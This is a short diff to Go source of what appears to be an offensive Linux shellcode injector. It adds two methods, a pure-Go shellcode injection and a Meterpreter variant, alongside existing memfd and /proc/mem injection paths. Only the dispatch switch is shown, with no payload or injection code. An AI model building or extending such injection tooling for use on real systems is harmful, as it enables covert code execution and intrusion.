@@ -29,6 +29,10 @@ func (l *linuxInjector) Inject(shellcode []byte) error {
 		return l.injectMemFD(shellcode)
 	case MethodProcMem:
 		return l.injectProcMem(shellcode)
+	case MethodPureGoShellcode:
+		return InjectPureGo(shellcode)
+	case MethodPureGoMeterpreter:
+		return fmt.Errorf("purego-meter requires sockfd; use InjectMeterpreterWrapper directly")
 	default:
 		return fmt.Errorf("unknown injection method for Linux: %s", l.config.Method)
 	}
